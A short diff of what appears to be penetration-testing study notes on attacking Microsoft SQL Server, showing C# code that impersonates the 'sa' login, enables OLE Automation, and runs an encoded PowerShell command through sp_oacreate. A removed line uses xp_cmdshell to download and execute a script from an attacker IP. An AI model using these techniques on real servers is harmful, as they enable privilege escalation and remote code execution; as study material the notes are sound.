@@ -650,8 +650,8 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
   * Not possible to obtain the results from the executed command because of the local scope of the @myshell variable.
   * ```csharp
     String impersonateUser = "EXECUTE AS LOGIN = 'sa';";
-    String enable_ole = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
-    String execCmd = "EXEC xp_cmdshell 'powershell -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://192.168.45.197/runall.ps1\\\")\"'";
+    String enable_ole = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
+    String execCmd = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -e SQBFAFgAI...';";
 
     SqlCommand command = new SqlCommand(impersonateUser, con);
     SqlDataReader reader = command.ExecuteReader();
@@ -663,8 +663,6 @@ hashcat.exe -m 5600 hash.txt rockyou.txt
 
     command = new SqlCommand(execCmd, con);
     reader = command.ExecuteReader();
-    reader.Close();
-
     ```
 
 </details>
